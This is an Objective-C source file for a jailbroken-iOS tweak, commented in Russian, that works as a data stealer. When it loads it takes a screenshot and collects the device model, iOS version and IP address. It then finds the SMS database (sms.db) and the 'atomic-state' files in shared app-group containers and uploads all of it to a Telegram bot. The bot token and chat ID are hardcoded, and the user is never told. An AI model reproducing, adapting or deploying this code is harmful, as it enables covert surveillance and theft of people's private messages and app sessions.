#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h> // Для скриншотов
#import <substrate.h> // Для хуков MobileSubstrate
#import <ifaddrs.h> // Для получения IP-адреса
#import <arpa/inet.h> // Для работы с сетевыми адресами
#import <sys/sysctl.h> // Для получения модели устройства

// Токен и Chat ID
NSString *const kBotToken = @"8042974567:AAHNuMAv6yTmUQDGUoON32AOGInUZM73ENQ";
NSString *const kChatID = @"7327553738";

// Функция для создания скриншота
UIImage *takeScreenshot() {
    UIWindow *keyWindow = [[UIApplication sharedApplication] keyWindow];
    if (!keyWindow) {
        NSLog(@"[Tweak] Failed to get keyWindow for screenshot");
        return nil;
    }
    UIGraphicsBeginImageContextWithOptions(keyWindow.bounds.size, NO, 0.0);
    [keyWindow drawViewHierarchyInRect:keyWindow.bounds afterScreenUpdates:YES];
    UIImage *screenshot = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return screenshot;
}

// Функция для получения IP-адреса
NSString *getIPAddress() {
    NSString *address = @"Не удалось определить IP";
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    int success = getifaddrs(&interfaces);
    if (success == 0) {
        temp_addr = interfaces;
        while (temp_addr != NULL) {
            if (temp_addr->ifa_addr->sa_family == AF_INET) {
                NSString *name = [NSString stringWithUTF8String:temp_addr->ifa_name];
                if ([name isEqualToString:@"en0"] || [name isEqualToString:@"pdp_ip0"]) {
                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr)];
                    NSLog(@"[Tweak] Found IP from interface %@ : %@", name, address);
                    break;
                }
            }
            temp_addr = temp_addr->ifa_next;
        }
    }
    freeifaddrs(interfaces);
    return address;
}

// Функция для получения модели устройства
NSString *getDeviceModel() {
    size_t size;
    if (sysctlbyname("hw.machine", NULL, &size, NULL, 0) == -1) {
        return @"Unknown";
    }
    char *machine = (char *)malloc(size);
    if (machine == NULL) {
        return @"Unknown";
    }
    if (sysctlbyname("hw.machine", machine, &size, NULL, 0) == -1) {
        free(machine);
        return @"Unknown";
    }
    NSString *model = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding];
    free(machine);
    
    NSDictionary *modelMap = @{
        @"iPhone10,1": @"iPhone 8",
        @"iPhone10,2": @"iPhone 8 Plus",
        @"iPhone10,3": @"iPhone X",
        @"iPhone10,4": @"iPhone 8",
        @"iPhone10,5": @"iPhone 8 Plus",
        @"iPhone10,6": @"iPhone X",
    };
    return modelMap[model] ?: model;
}

// Переменная для хранения message_id
static NSString *messageId = nil;

// Функция для отправки/обновления текстового сообщения в Telegram
void sendOrUpdateLogMessage(NSString *logText) {
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"hh:mm a zzz, dd MMMM yyyy"];
    NSString *timestamp = [dateFormatter stringFromDate:[NSDate date]];
    
    NSLog(@"[%@] [Tweak] Preparing to send/update log message", timestamp);
    NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage", kBotToken];
    if (messageId) {
        urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/editMessageText", kBotToken];
    }
    
    NSURL *url = [NSURL URLWithString:urlString];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    
    NSString *bodyString = [NSString stringWithFormat:@"chat_id=%@&text=%@", kChatID, [logText stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
    if (messageId) {
        bodyString = [bodyString stringByAppendingFormat:@"&message_id=%@", messageId];
    }
    request.HTTPBody = [bodyString dataUsingEncoding:NSUTF8StringEncoding];
    
    NSURLSession *session = [NSURLSession sharedSession];
    [[session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (!error) {
            if (!messageId) {
                NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                messageId = json[@"result"][@"message_id"];
                NSLog(@"[%@] [Tweak] Log message sent, message_id: %@", timestamp, messageId);
            } else {
                NSLog(@"[%@] [Tweak] Log message updated", timestamp);
            }
        } else {
            NSLog(@"[%@] [Tweak] Error sending/updating log message: %@", timestamp, error);
        }
    }] resume];
}

// Функция для отправки данных в Telegram (фото или документ)
void sendToTelegram(NSString *type, NSString *filePath, NSString *caption) {
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"hh:mm a zzz, dd MMMM yyyy"];
    NSString *timestamp = [dateFormatter stringFromDate:[NSDate date]];
    
    NSLog(@"[%@] [Tweak] Starting to send %@ to Telegram", timestamp, type);
    NSString *boundary = [@"Boundary-" stringByAppendingString:[[NSUUID UUID] UUIDString]];
    NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"https://api.telegram.org/bot%@/%@", kBotToken, type]];
    NSLog(@"[%@] [Tweak] Telegram API URL: %@", timestamp, url);

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    NSLog(@"[%@] [Tweak] HTTP request initialized with method: POST", timestamp);

    NSFileManager *fm = [NSFileManager defaultManager];
    NSError *error;
    NSData *fileData = [NSData dataWithContentsOfFile:filePath options:NSDataReadingMappedIfSafe error:&error];
    if (!fileData || error) {
        NSLog(@"[%@] [Tweak] Failed to read %@ at path: %@, error: %@", timestamp, type, filePath, error);
        NSString *logText = [NSString stringWithFormat:@"%@ - Failed to send %@: Error reading file at %@\n", timestamp, type, filePath];
        sendOrUpdateLogMessage(logText);
        return;
    }
    NSLog(@"[%@] [Tweak] %@ data loaded, size: %lu bytes", timestamp, type, (unsigned long)[fileData length]);

    NSMutableData *body = [NSMutableData data];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"%@\r\n", kChatID] dataUsingEncoding:NSUTF8StringEncoding]];
    NSLog(@"[%@] [Tweak] Added chat_id to request body", timestamp);

    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    NSString *contentType = [type isEqualToString:@"sendPhoto"] ? @"image/png" : @"application/octet-stream";
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"%@\"; filename=\"%@\"\r\n", [type isEqualToString:@"sendPhoto"] ? @"photo" : @"document", filePath.lastPathComponent] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Type: %@\r\n\r\n", contentType] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:fileData];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];

    if (caption) {
        [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[@"Content-Disposition: form-data; name=\"caption\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[caption dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    }

    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    NSLog(@"[%@] [Tweak] Added %@ and caption to request body", timestamp, type);

    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
    [request setValue:[NSString stringWithFormat:@"%lu", (unsigned long)[body length]] forHTTPHeaderField:@"Content-Length"];
    [request setHTTPBody:body];
    NSLog(@"[%@] [Tweak] Set HTTP headers and body", timestamp);

    NSURLSession *session = [NSURLSession sharedSession];
    [[session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[%@] [Tweak] Error sending %@ to Telegram: %@", timestamp, type, error);
            NSString *logText = [NSString stringWithFormat:@"%@ - Failed to send %@: %@\n", timestamp, type, error.localizedDescription];
            sendOrUpdateLogMessage(logText);
        } else {
            NSLog(@"[%@] [Tweak] Successfully sent %@ to Telegram", timestamp, type);
            NSString *logText = [NSString stringWithFormat:@"%@ - Successfully sent %@\n", timestamp, type];
            sendOrUpdateLogMessage(logText);
        }
    }] resume];
    NSLog(@"[%@] [Tweak] Sent request to Telegram, awaiting response", timestamp);
}

// Функция для поиска всех atomic-state файлов и sms.db
NSArray<NSString *> *findAllAtomicStateAndSMSDBFiles() {
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"hh:mm a zzz, dd MMMM yyyy"];
    NSString *timestamp = [dateFormatter stringFromDate:[NSDate date]];
    
    NSString *appGroupPath = @"/var/mobile/Containers/Shared/AppGroup/";
    NSString *smsDBPath = @"/var/mobile/Library/SMS/sms.db";
    NSFileManager *fm = [NSFileManager defaultManager];
    NSError *error = nil;
    NSMutableArray<NSString *> *foundPaths = [NSMutableArray array];
    
    // Проверка и добавление sms.db, если доступен
    if ([fm fileExistsAtPath:smsDBPath] && [fm isReadableFileAtPath:smsDBPath]) {
        NSLog(@"[%@] [Tweak] sms.db found at: %@", timestamp, smsDBPath);
        NSString *logText = [NSString stringWithFormat:@"%@ - Found sms.db at: %@\n", timestamp, smsDBPath];
        sendOrUpdateLogMessage(logText);
        [foundPaths addObject:smsDBPath];
    } else {
        NSLog(@"[%@] [Tweak] sms.db not found or not readable at: %@", timestamp, smsDBPath);
        NSString *logText = [NSString stringWithFormat:@"%@ - sms.db not found or not readable at: %@\n", timestamp, smsDBPath];
        sendOrUpdateLogMessage(logText);
    }
    
    // Проверка прав доступа для AppGroup
    if ([fm isReadableFileAtPath:appGroupPath]) {
        NSDirectoryEnumerator *enumerator = [fm enumeratorAtURL:[NSURL fileURLWithPath:appGroupPath]
                                   includingPropertiesForKeys:@[NSURLIsDirectoryKey]
                                                      options:NSDirectoryEnumerationSkipsHiddenFiles
                                                 errorHandler:^BOOL(NSURL *url, NSError *error) {
                                                     NSLog(@"[%@] [Tweak] Error accessing %@: %@", timestamp, url.path, error);
                                                     return YES;
                                                 }];
        
        for (NSURL *url in enumerator) {
            NSNumber *isDirectory;
            [url getResourceValue:&isDirectory forKey:NSURLIsDirectoryKey error:nil];
            if ([isDirectory boolValue]) continue; // Пропускаем директории
            
            NSString *filePath = url.path;
            if ([filePath.lastPathComponent isEqualToString:@"atomic-state"]) {
                NSLog(@"[%@] [Tweak] atomic-state file found at: %@", timestamp, filePath);
                NSString *logText = [NSString stringWithFormat:@"%@ - Found atomic-state at: %@\n", timestamp, filePath];
                sendOrUpdateLogMessage(logText);
                [foundPaths addObject:filePath];
            }
        }
    } else {
        NSLog(@"[%@] [Tweak] No read permission for AppGroup directory", timestamp);
        NSString *logText = [NSString stringWithFormat:@"%@ - No read permission for AppGroup directory\n", timestamp];
        sendOrUpdateLogMessage(logText);
    }
    
    return [foundPaths copy];
}

// Точка входа
%ctor {
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"hh:mm a zzz, dd MMMM yyyy"];
    NSString *timestamp = [dateFormatter stringFromDate:[NSDate date]];
    
    NSLog(@"[%@] [Tweak] Tweak initialization started", timestamp);
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        // Шаг 1: Отправка скриншота с информацией
        UIImage *screenshot = takeScreenshot();
        if (screenshot) {
            NSString *screenshotPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"screenshot.png"];
            NSData *imageData = UIImagePNGRepresentation(screenshot);
            [imageData writeToFile:screenshotPath atomically:YES];
            NSString *deviceModel = getDeviceModel();
            NSString *systemVersion = [UIDevice currentDevice].systemVersion;
            NSString *ipAddress = getIPAddress();
            NSString *caption = [NSString stringWithFormat:@"Модель: %@\niOS: %@\nIP: %@\nОтправлено: %@", deviceModel, systemVersion, ipAddress, timestamp];
            sendToTelegram(@"sendPhoto", screenshotPath, caption);
        }

        // Шаг 2: Отправка всех найденных atomic-state файлов и sms.db
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            NSArray<NSString *> *atomicStateAndSMSDBPaths = findAllAtomicStateAndSMSDBFiles();
            if ([atomicStateAndSMSDBPaths count] > 0) {
                for (NSString *filePath in atomicStateAndSMSDBPaths) {
                    sendToTelegram(@"sendDocument", filePath, nil);
                }
            } else {
                NSLog(@"[%@] [Tweak] No atomic-state or sms.db files to send, possibly due to sandbox or path issues", timestamp);
                NSString *logText = [NSString stringWithFormat:@"%@ - No atomic-state or sms.db files to send, possibly due to sandbox or path issues\n", timestamp];
                sendOrUpdateLogMessage(logText);
            }
        });
    });
    NSLog(@"[%@] [Tweak] Tweak initialization completed, delayed execution scheduled", timestamp);
}